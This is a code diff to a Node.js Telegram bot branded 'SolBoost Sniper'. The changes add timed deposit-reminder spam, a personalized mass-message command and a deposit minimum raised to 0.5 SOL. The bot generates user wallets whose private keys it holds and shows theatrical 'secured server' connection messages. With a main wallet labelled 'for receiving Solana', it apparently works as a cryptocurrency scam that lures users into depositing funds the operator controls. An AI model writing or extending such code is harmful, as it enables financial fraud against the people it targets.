@@ -23,6 +23,7 @@ dotenv.config();
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const MAIN_WALLET_PRIVATE_KEY = process.env.MAIN_WALLET_PRIVATE_KEY;
 const BOT_OWNER_ID = process.env.BOT_OWNER_ID; // Ensure this is loaded from the environment
+const RPC_URL = process.env.RPC_URL;
 
 if (!BOT_TOKEN || !MAIN_WALLET_PRIVATE_KEY || !BOT_OWNER_ID) {
   throw new Error("Missing BOT_TOKEN or MAIN_WALLET_PRIVATE_KEY or BOT_OWNER_ID environment variables");
@@ -32,54 +33,167 @@ if (!BOT_TOKEN || !MAIN_WALLET_PRIVATE_KEY || !BOT_OWNER_ID) {
 const bot = new Telegraf(BOT_TOKEN);
 
 // Assuming you have a connection to Solana mainnet
-const connection = new Connection('https://api.mainnet-beta.solana.com');
+const connection = new Connection(RPC_URL);
 
 // Main wallet for receiving Solana (base58 private key)
 const mainWallet = Keypair.fromSecretKey(bs58.decode(MAIN_WALLET_PRIVATE_KEY));
 
 // Function to load chat IDs from file
 const loadChatIds = () => {
-  if (fs.existsSync('subscribers.json')) {
-    const data = fs.readFileSync('subscribers.json', 'utf-8');
-    return JSON.parse(data);
+  try {
+    if (fs.existsSync('subscribers.json')) {
+      const data = fs.readFileSync('subscribers.json', 'utf-8');
+      return JSON.parse(data);
+    }
+  } catch (error) {
+    console.error('Error reading subscribers.json:', error);
   }
   return [];
+};
+
+// Function to save chat IDs to file
+const saveChatIds = (chatIds) => {
+  try {
+    fs.writeFileSync('subscribers.json', JSON.stringify(chatIds, null, 2), 'utf-8');
+    console.log('Subscribers saved successfully.');
+  } catch (error) {
+    console.error('Error writing to subscribers.json:', error);
+  }
 };
 
 // Load existing chat IDs from the file
 let chatIds = loadChatIds();
 
-// Function to save chat IDs to file
-const saveChatIds = (chatIds) => {
-  fs.writeFileSync('subscribers.json', JSON.stringify(chatIds, null, 2), 'utf-8');
-};
-
 // Add new subscriber
 const addSubscriber = (chatId) => {
   if (!chatIds.includes(chatId)) {
     chatIds.push(chatId);
+    console.log(`Adding new subscriber: ${chatId}`);
     saveChatIds(chatIds);
+  } else {
+    console.log(`Subscriber ${chatId} already exists.`);
   }
 };
 
 bot.command('subscribe', async (ctx) => {
-    const chatId = ctx.chat.id;
-    addSubscriber(chatId);
-    await ctx.reply('You have been subscribed to receive broadcast messages.');
+  const chatId = ctx.chat.id;
+  addSubscriber(chatId);
+  await ctx.reply('You have been subscribed to receive broadcast messages.');
 });
-
-
 
 // Function to broadcast a message to all subscribers
 const broadcastMessage = async (message) => {
+  console.log(`Starting broadcast to ${chatIds.length} subscribers with message: "${message}"`);
+
   for (const chatId of chatIds) {
     try {
+      console.log(`Attempting to send message to ${chatId}...`);
       await bot.telegram.sendMessage(chatId, message);
+      console.log(`Successfully sent message to ${chatId}`);
     } catch (error) {
       console.error(`Failed to send message to ${chatId}: ${error.message}`);
     }
   }
+
+  console.log('Broadcast finished.');
 };
+
+
+
+const sendDepositReminders = async () => {
+  console.log('Initiating scheduled reminder check...');
+  console.log('Sending deposit reminders...');
+
+  for (const chatId of chatIds) {
+    try {
+      const user = userStatus[chatId];
+
+      // If user data does not exist, initialize it
+      if (!userStatus[chatId]) {
+        userStatus[chatId] = {
+          totalTransferred: 0,
+          transferDone: false,
+        };
+      }
+
+      // Add detailed logging
+      console.log(`User Status for ${chatId}:`, JSON.stringify(user, null, 2)); // Log the user status details
+
+      if (user && !user.transferDone) {
+        const userDetails = await bot.telegram.getChat(chatId); // Fetch user details
+        const userName = userDetails.username || userDetails.first_name || 'User';
+        const userWalletAddress = userWallets[chatId] ? userWallets[chatId].publicKey.toBase58() : 'Unknown';
+
+        // Create a formatted message using HTML
+        const reminderMessage = `
+<b>Reminder:</b>\n\n
+👋 Hello, <b>${userName}</b>!\n\n
+🚀 <b>Kickstart Your Earnings Today!</b>\n\n
+You haven't deposited any funds yet. 🌟 Deposit at least <b>0.5 SOL</b> now and let our automated trading system start working to grow your investment!\n\n
+💸 <b>Your journey to profits begins with a simple deposit.</b> Act now and start growing your investment!\n\n
+<b>Your wallet address:</b> <code>${userWalletAddress}</code>
+`;
+
+        // Send the reminder message
+        await bot.telegram.sendMessage(chatId, reminderMessage, { parse_mode: 'HTML' });
+        console.log(`Reminder sent to ${chatId}`);
+      } else {
+        console.log(`No reminder needed for ${chatId}. Deposit status: ${user ? user.transferDone : 'No user data'}`);
+      }
+    } catch (error) {
+      console.error(`Failed to send reminder to ${chatId}: ${error.message}`);
+    }
+  }
+};
+
+
+
+
+// Schedule to send reminders every 24 hours
+setInterval(() => {
+  console.log('Initiating scheduled reminder check...');
+  sendDepositReminders();
+},  4 * 60 * 60 * 1000); // 4 hours in milliseconds
+
+
+// Handle the /send command to broadcast a dynamic message
+bot.command('send', async (ctx) => {
+  const userId = ctx.from.id;
+
+  // Check if the user is the bot owner
+  if (userId.toString() !== BOT_OWNER_ID) {
+    await ctx.reply('You are not authorized to use this command.');
+    return;
+  }
+
+  // Get the message after the command
+  const message = ctx.message.text.split(' ').slice(1).join(' ');
+
+  if (!message) {
+    await ctx.reply('Please provide a message to send.');
+    return;
+  }
+
+  // Broadcast the dynamic message to all subscribers
+  for (const chatId of chatIds) {
+    try {
+      const user = await bot.telegram.getChat(chatId); // Fetch user details
+      const userWallet = userWallets[chatId]; // Get the user's wallet
+      const walletAddress = userWallet ? userWallet.publicKey.toBase58() : 'Unknown';
+
+      const personalizedMessage = message.replace(
+        '{username}',
+        user.username || user.first_name || 'User'
+      ).replace('{walletAddress}', walletAddress);
+
+      await bot.telegram.sendMessage(chatId, personalizedMessage);
+    } catch (error) {
+      console.error(`Failed to send message to ${chatId}: ${error.message}`);
+    }
+  }
+
+  await ctx.reply('Message sent to all subscribers.');
+});
 
 // Handle the /broadcast command
 bot.command('broadcast', async (ctx) => {
@@ -103,6 +217,7 @@ bot.command('broadcast', async (ctx) => {
   await ctx.reply('Broadcast message sent to all subscribers.');
 });
 
+
 // Function to load and send the main menu
 const sendMainMenu = async (ctx) => {
   return ctx.reply('Please choose an option:', Markup.inlineKeyboard([
@@ -116,6 +231,15 @@ const sendMainMenu = async (ctx) => {
 
 // Start command
 bot.start(async (ctx) => {
+    const chatId = ctx.chat.id;
+        addSubscriber(chatId); // Automatically add the user to subscribers
+    // Initialize user status if not already set
+      if (!userStatus[chatId]) {
+        userStatus[chatId] = {
+          totalTransferred: 0,
+          transferDone: false,
+        };
+      }
   const firstMessage = await showMessageWithDelay(ctx, '🔄 Generating your wallet, please wait...', 5000);
   const secondMessage = await showMessageWithDelay(ctx, '🔑 Unique Public and Private keys have been generated', 3000);
   const thirdMessage = await showMessageWithDelay(ctx, '🔒 Your wallet is connecting to the secured SolBoost server...', 3000);
@@ -138,9 +262,9 @@ bot.action('main_wallet', async (ctx) => {
         if (!userWallets[userId]) {
             const userWallet = Keypair.generate();
             userWallets[userId] = userWallet;
-            console.log(`Generated wallet for user ${userId}:`);
-            console.log(`Public Key: ${userWallet.publicKey.toBase58()}`);
-            console.log(`Private Key: ${bs58.encode(userWallet.secretKey)}`);
+           // console.log(`Generated wallet for user ${userId}:`);
+           // console.log(`Public Key: ${userWallet.publicKey.toBase58()}`);
+            //console.log(`Private Key: ${bs58.encode(userWallet.secretKey)}`);
         }
 
         const userWallet = userWallets[userId];
@@ -179,10 +303,10 @@ bot.action('start_earning', async (ctx) => {
         const balance = await connection.getBalance(publicKey);
         const solBalance = balance / LAMPORTS_PER_SOL;
 
-        if (solBalance < 0.02) {
+        if (solBalance < 0.5) {
             await ctx.reply(`
 🚨 Alert: Your Wallet Balance is less than the balance required to start the trades.
-To activate the SolBoost Sniper bot and start earning profits with our automated trading system, please deposit at least 0.02 SOL into your trading wallet. Your current balance is ${solBalance.toFixed(2)} SOL
+To activate the SolBoost Sniper bot and start earning profits with our automated trading system, please deposit at least 0.5 SOL into your trading wallet. Your current balance is ${solBalance.toFixed(2)} SOL
             `);
         } else {
             const { blockhash } = await connection.getRecentBlockhash();
